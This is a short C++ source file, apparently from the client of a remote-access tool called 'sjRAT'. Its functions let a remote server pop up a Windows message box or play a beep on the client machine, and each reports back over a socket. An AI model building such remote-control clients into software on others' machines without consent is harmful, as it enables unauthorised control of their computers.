#include "client_func.h"

// send callback to server
void send_callback(SOCKET s, std::string cb_text)
{
  send(s, cb_text.c_str(), cb_text.size(), 0);
}

void client::msgbox(SOCKET s, std::string msg_text)
{
  MessageBox(NULL, msg_text.c_str(), "sjRAT", MB_OK | MB_ICONINFORMATION);

  std::string callback = "Message box was summoned!";

  send_callback(s, callback);
}

void client::msgbeep(SOCKET s, DWORD duration)
{
  std::string callback = "Beep is playing for " + std::to_string(duration) + " seconds... Please wait...";
  send_callback(s, callback);

  Beep(1500, duration * 1000);
}